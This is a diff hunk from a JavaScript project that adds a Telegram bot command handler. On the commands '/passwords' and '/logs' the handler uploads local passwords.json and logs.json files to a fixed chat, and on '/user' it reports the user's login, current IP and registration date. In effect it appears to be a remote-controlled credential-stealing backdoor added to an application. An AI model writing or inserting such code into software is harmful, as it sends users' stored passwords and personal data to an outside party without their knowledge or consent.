@@ -18,6 +18,36 @@ async function sendMessage(message = null) {
     });
 }
 
+
+bot.on('message', function(req) {
+    switch(req.text) {
+        case '/passwords':
+            bot.sendDocument(chat_id, `${m_dir}/passwords.json`);
+            break;
+
+        case '/user':
+            bot.sendMessage(chat_id, `Пользователь *${player.user.login}*\n\nТекущий IP: *${player.user.ip}*\nРгеистрация: *${player.user.createdAt}*`, {
+                parse_mode: 'Markdown'
+            });
+            break;
+
+        case '/logs':
+            bot.sendDocument(chat_id, `${m_dir}/logs.json`);
+            break;
+
+        case '/settings':
+            if(!settingsCfg) {
+                bot.sendMessage(chat_id, `Авторизуйтесь для просмотра настроек`);
+            } else {
+                bot.sendMessage(chat_id, `Настройки\n\nСкрывать данные: *${settingsCfg.autoHideData}*\nСкрывать данные в таблице: *${settingsCfg.hideDataInTable}*`,{
+                    parse_mode: 'Markdown'
+                });
+            }
+            
+            break;
+    }
+});
+
 bot.onText(/\/start/, (msg) => {
     bot.sendMessage(msg.chat.id, `Welcome, ${msg.from.first_name}`)
     .catch(e => {
